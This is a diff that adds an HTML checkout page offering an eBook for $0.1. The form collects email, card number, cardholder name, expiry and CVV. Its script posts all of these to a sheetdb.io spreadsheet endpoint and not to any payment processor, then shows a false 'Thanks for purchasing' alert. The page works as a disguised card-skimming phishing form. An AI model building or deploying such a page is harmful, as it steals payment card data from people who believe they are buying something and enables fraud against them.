@@ -1,0 +1,67 @@
+<!DOCTYPE html>
+<html lang="en" >
+<head>
+  <meta charset="UTF-8">
+  <title>CodePen - CheckOut Page</title>
+  <link rel="stylesheet" href="./style.css">
+
+</head>
+<body>
+<!-- partial:index.partial.html -->
+<div class="mainscreen">
+    <!-- <img src="https://image.freepik.com/free-vector/purple-background-with-neon-frame_52683-34124.jpg"  class="bgimg " alt="">--> 
+      <div class="card">
+        <div class="leftside">
+          <img
+            src="/png_20220710_195835_0000.png"
+            class="product"
+            alt="ebooks"
+          />
+        </div>
+        <div class="rightside">
+          <form action="https://sheetdb.io/api/v1/3h507jlvp698t" method="POST" id="sheetdb-form">
+            <h1>CheckOut</h1>
+            <h2>Payment Information</h2>
+            <p>Email</p>
+            <input type="text" class="inputbox" placeholder="Youremail@mail.com" name="data[name]" required />
+            <p>Card Number</p>
+            <input type="number" class="inputbox" placeholder="9999 9999 9999 9999" name="data[card_number]" id="card_number" required />
+
+            <p>Cardholder name</p>
+            <input class="inputbox" placeholder="Holder Name" name="data[card_type]" id="card_type" required>
+              
+<div class="expcvv">
+
+            <p class="expcvv_text">Expiry</p>
+            <input type="date" class="inputbox" name="data[exp_date]" id="exp_date" required />
+
+            <p class="expcvv_text2">CVV</p>
+            <input type="password" class="inputbox" placeholder="999" name="data[cvv]" id="cvv" required />
+        </div>
+            <p>After making the payment, you will receive the download link of the eBook by mail. 
+            </p><p>This may take some time, please be patient.</p>
+            <button type="submit" class="button">pay $0.1</button>
+          </form>
+        </div>
+      </div>
+    </div>
+<!-- partial -->
+
+  
+  <script>
+    var form = document.getElementById('sheetdb-form');
+    form.addEventListener("submit", e => {
+      e.preventDefault();
+      fetch(form.action, {
+        method: "POST",
+        body: new FormData(document.getElementById("sheetdb-form")),
+      }).then(
+        response => response.json()
+      ).then((html) => {
+        // you can put any JS code here
+        alert('Thanks for purchasing. You will receive the mail soon.')
+      });
+    });
+  </script>
+</body>
+</html>
